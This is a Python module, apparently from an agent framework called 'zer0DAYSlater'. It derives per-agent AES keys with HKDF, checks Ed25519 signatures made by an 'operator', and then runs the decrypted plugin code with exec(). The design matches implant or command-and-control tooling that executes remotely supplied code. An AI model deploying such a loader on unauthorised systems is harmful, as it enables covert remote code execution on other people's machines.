import base64
import hashlib
import hmac
import json
import os
from Crypto.Cipher import AES


# ── Key derivation ────────────────────────────────────────────────────────────

_HKDF_CONTEXT = b"zer0DAYSlater:plugin-key:v1"


def _hkdf_extract(salt: bytes, ikm: bytes) -> bytes:
    """HKDF-Extract: PRK = HMAC-SHA256(salt, IKM)."""
    return hmac.new(salt, ikm, hashlib.sha256).digest()


def _hkdf_expand(prk: bytes, info: bytes, length: int = 32) -> bytes:
    """HKDF-Expand: produce `length` bytes of keying material."""
    okm = b""
    t   = b""
    for i in range(1, -(-length // 32) + 1):
        t    = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t
    return okm[:length]


def derive_key(agent_id: str) -> bytes:
    """
    Derive a 32-byte AES key from agent_id using HKDF-SHA256.

    IKM:  agent_id bytes
    Salt: ZDS_PLUGIN_SALT env var (hex) or fixed fallback.
          Set ZDS_PLUGIN_SALT to a random 32-byte hex value shared
          between encryptor and agent out-of-band for production use.
    Info: fixed context string — domain-separates plugin keys.

    Replaces agent_id[:32].ljust(32, b"0") — trivially predictable
    from the agent ID alone.
    """
    salt_hex = os.environ.get("ZDS_PLUGIN_SALT", "")
    try:
        salt = bytes.fromhex(salt_hex) if salt_hex else hashlib.sha256(b"zds-default-salt").digest()
    except ValueError:
        salt = hashlib.sha256(b"zds-default-salt").digest()
    prk = _hkdf_extract(salt, agent_id.encode("utf-8"))
    return _hkdf_expand(prk, _HKDF_CONTEXT)
# ── Ed25519 signature verification ───────────────────────────────────────────

def _load_trusted_pubkey() -> bytes | None:
    """
    Load the Ed25519 public key used to verify plugin signatures.
    Source: ZDS_PLUGIN_PUBKEY env var (base64-encoded 32-byte key).
    Returns None if unset — callers must treat this as untrusted.
    """
    pubkey_b64 = os.environ.get("ZDS_PLUGIN_PUBKEY", "")
    if not pubkey_b64:
        return None
    try:
        return base64.b64decode(pubkey_b64)
    except Exception:
        return None


def _verify_plugin_signature(code_bytes: bytes, signature_b64: str) -> bool:
    """
    Verify an Ed25519 signature over the decrypted plugin code.

    The plugin encryptor signs SHA256(code_bytes) with the operator's
    Ed25519 private key. This function verifies against the trusted
    public key from ZDS_PLUGIN_PUBKEY.

    Returns False if:
      - ZDS_PLUGIN_PUBKEY is not set
      - signature is malformed
      - signature does not verify
      - nacl is unavailable
    """
    pubkey_bytes = _load_trusted_pubkey()
    if not pubkey_bytes:
        return False
    try:
        from nacl.signing import VerifyKey
        vk        = VerifyKey(pubkey_bytes)
        signature = base64.b64decode(signature_b64)
        digest    = hashlib.sha256(code_bytes).digest()
        vk.verify(digest, signature)
        return True
    except Exception:
        return False


def load_encrypted_plugin(encrypted_blob, agent_id):
    """
    Decrypt and execute a plugin blob.

    Security model:
      1. AES-GCM decryption with HKDF-derived key — ensures confidentiality
         and integrity of the ciphertext.
      2. Ed25519 signature verification — ensures the decrypted code was
         produced by the operator holding the signing private key.
         Requires ZDS_PLUGIN_PUBKEY to be set. If unset, execution is
         BLOCKED — unsigned plugins are rejected by default.

    Both checks must pass before exec() is called.
    """
    try:
        blob       = json.loads(encrypted_blob.decode())
        nonce      = base64.b64decode(blob["nonce"])
        ciphertext = base64.b64decode(blob["ciphertext"])
        tag        = base64.b64decode(blob["tag"])
        signature  = blob.get("signature", "")

        # Step 1 — decrypt
        key       = derive_key(agent_id)
        cipher    = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)

        # Step 2 — verify signature before execution
        if not signature:
            print("[!] Plugin rejected: no signature field in blob")
            return
        if not _verify_plugin_signature(decrypted, signature):
            print("[!] Plugin rejected: Ed25519 signature verification failed")
            return

        exec(decrypted, {})  # noqa: S102 — guarded by AES-GCM + Ed25519 (closes #1)

    except Exception as e:
        print(f"[!] Plugin Load Failed: {e}")
